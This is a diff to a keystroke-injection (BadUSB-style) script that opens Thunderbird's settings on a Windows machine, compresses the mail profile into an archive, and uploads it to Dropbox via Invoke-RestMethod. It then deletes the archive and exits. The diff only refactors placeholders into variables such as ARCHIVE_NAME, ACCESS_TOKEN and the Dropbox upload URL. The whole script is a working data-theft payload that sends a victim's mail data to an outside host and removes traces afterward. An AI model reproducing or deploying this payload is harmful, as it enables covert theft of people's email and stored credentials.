@@ -8,6 +8,12 @@
 * REM #                                                             #
 * REM ###############################################################
 
+* REM Variables Settings
+ARCHIVE_NAME="cache.zip"
+ACCESS_TOKEN="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Sdlk1cGxvbzFPSQ=="
+DROPBOX_FOLDER_PATH="/"
+DROPBOX_CONST_LINK ="https://content.dropboxapi.com/2/files/upload"
+
 * REM Opening Thunderbird settings
 QUACK DELAY 1500
 QUACK GUI r
@@ -77,26 +83,21 @@ QUACK STRING Compress-Archive -LiteralPath
 QUACK DELAY 500
 QUACK CTRL v
 QUACK DELAY 500
-* REM Required replace '[2]': Set here the archive name, you must use the same!
-QUACK STRING  -DestinationPath ./[2]
+QUACK STRING  -DestinationPath ./$ARCHIVE_NAME
 QUACK ENTER
 QUACK DELAY 1000
 
 * REM Exfiltration via Dropbox
-* REM Required replace '[2]': Set here the archive name, you must use the same!
-QUACK STRING $filePath = "$env:TEMP/[2]"
+QUACK STRING $filePath = "$env:TEMP/$ARCHIVE_NAME"
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING $filePath = $filePath -replace "\\", "/"
 QUACK ENTER
 QUACK DELAY 500
-* REM Required replace '[2]': Set here the archive name, you must use the same!
-* REM Required replace '[3]': Set here the path of your dropbox folder, i.e. '/'
-QUACK STRING $dropboxPath = "[3][2]"
+QUACK STRING $dropboxPath = "$DROPBOX_FOLDER_PATH$ARCHIVE_NAME"
 QUACK ENTER
 QUACK DELAY 500
-* REM Required replace '[1]': Set here your Dropbox access TOKEN, i.e. mine is aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Sdlk1cGxvbzFPSQ==
-QUACK STRING $accessToken = "[1]"
+QUACK STRING $accessToken = "$ACCESS_TOKEN"
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING $fileContent = [System.IO.File]::ReadAllBytes($filePath)
@@ -117,5 +118,5 @@ QUACK DELAY 500
 QUACK STRING }
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileContent; rm $filePath; exit
+QUACK STRING Invoke-RestMethod -Uri "$DROPBOX_CONST_LINK" -Method Post -Headers $headers -Body $fileContent; rm $filePath; exit
 QUACK ENTER
